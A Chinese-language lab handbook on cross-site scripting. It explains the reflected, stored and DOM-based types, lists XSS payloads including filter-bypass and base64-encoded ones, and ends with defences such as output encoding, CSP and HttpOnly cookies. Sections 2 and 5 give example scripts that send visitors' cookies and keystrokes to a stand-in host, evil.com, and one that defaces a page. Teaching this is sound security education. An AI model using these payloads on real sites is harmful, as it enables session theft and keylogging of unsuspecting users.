# 💉 实验手册：XSS 跨站脚本攻击

### 0. 序言
在 Web 的世界里，浏览器就像一个过于信任的执行者。你给它什么代码，它就执行什么代码——哪怕这代码是从一个可疑的输入框里偷渡进来的。

*   **XSS（Cross-Site Scripting）**：一种让攻击者在受害者浏览器中执行恶意脚本的攻击方式。
*   **为什么叫 XSS 不叫 CSS？**：因为 CSS 已经被层叠样式表抢注了，所以只好用 X 来代替 Cross。

本章练习的目标很简单：**让浏览器执行一段它不该执行的 JavaScript。**

---

### 1. 反射型 XSS：一去不回的镜子

**原理简介**：
当用户的输入被服务器原封不动地"反射"回页面，并且没有进行适当的编码处理时，恶意脚本就有了可乘之机。

**经典场景**：
```
搜索框输入：<script>alert('XSS')</script>
页面显示：您搜索的是：<script>alert('XSS')</script>
浏览器：好的，让我执行一下这段代码...
```

**冷知识**：
反射型 XSS 需要诱导用户点击特制的链接才能触发，所以它常常和社会工程学配合使用。那些"点击领取百万大奖"的链接，很可能就藏着这种东西。

**避坑指南**：
看到 URL 里有奇怪的 `<script>` 或者 `javascript:` 开头的内容？别点，真的别点。

---

### 2. 存储型 XSS：潜伏的定时炸弹

**原理简介**：
当恶意脚本被存储到服务器（比如数据库）中，每次有用户访问包含该脚本的页面时，脚本都会被执行。这就像在公共场所放了一颗定时炸弹，路过的人都会中招。

**攻击剧本**：
1. 攻击者在留言板发表一条"留言"：`<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>`
2. 留言被存储到数据库
3. 其他用户浏览留言板时，这段脚本被加载并执行
4. 用户的 Cookie 被悄悄发送到攻击者的服务器

**核心思想**：
你以为你在看留言，其实留言在"看"你的 Cookie。

---

### 3. DOM 型 XSS：前端自导自演

**原理简介**：
这种 XSS 完全发生在浏览器端，服务器甚至不知道发生了什么。当 JavaScript 代码不安全地处理用户输入（比如直接用 `innerHTML` 插入内容），攻击就发生了。

**危险操作示例**：
```javascript
// 从 URL 获取参数
const name = new URLSearchParams(location.search).get('name');
// 直接插入 DOM —— 危险！
document.getElementById('greeting').innerHTML = '欢迎, ' + name;
```

如果 URL 是 `?name=<img src=x onerror=alert('XSS')>`，那么恭喜，你成功触发了 XSS。

**讽刺点**：
服务器端做了完美的防护？没关系，前端自己就能搞砸一切。

---

### 4. 常见 XSS Payload 赏析

**入门级**：
```html
<script>alert('XSS')</script>
```

**进阶级**（绕过简单过滤）：
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

**高级技巧**（编码绕过）：
```html
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
<!-- atob 解码 base64，实际执行 alert('XSS') -->
```

**大师级**（利用事件处理器）：
```html
<div onmouseover="alert('XSS')">把鼠标放这里试试</div>
<input onfocus=alert('XSS') autofocus>
```

---

### 5. XSS 的危害：不只是弹窗

很多人以为 XSS 就是弹个 `alert()` 框，其实这只是"概念验证"。真正的攻击可以做到：

**窃取 Cookie**：
```javascript
new Image().src = "http://evil.com/steal?cookie=" + document.cookie;
```

**键盘记录**：
```javascript
document.onkeypress = function(e) {
    new Image().src = "http://evil.com/log?key=" + e.key;
}
```

**网页篡改**：
```javascript
document.body.innerHTML = '<h1>此网站已被黑客入侵</h1>';
```

**钓鱼攻击**：
```javascript
// 弹出假的登录框，骗取用户密码
```

---

### 6. 防御措施速览

**输入过滤**：
- 白名单优于黑名单
- 但不要只依赖前端过滤

**输出编码**：
- HTML 实体编码：`<` → `&lt;`
- JavaScript 编码：`'` → `\x27`
- URL 编码：`<` → `%3C`

**Content Security Policy (CSP)**：
```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```
告诉浏览器：只执行来自本站的脚本，别的一律不信。

**HttpOnly Cookie**：
```http
Set-Cookie: session=abc123; HttpOnly
```
JavaScript 无法访问带有 HttpOnly 标志的 Cookie。

---

### 7. 结语

XSS 的本质是"信任边界的突破"——浏览器信任了服务器返回的内容，而服务器又没有对用户输入做好把关。

记住：**永远不要信任用户输入，永远要对输出进行编码。**

现在，去靶场试试你的技能吧。如果你成功弹出了 `alert()`，那说明你已经掌握了基础。但如果你能窃取到自己的 Cookie，那才算真正入门。

---

**[准备好了吗？开始注入吧]**
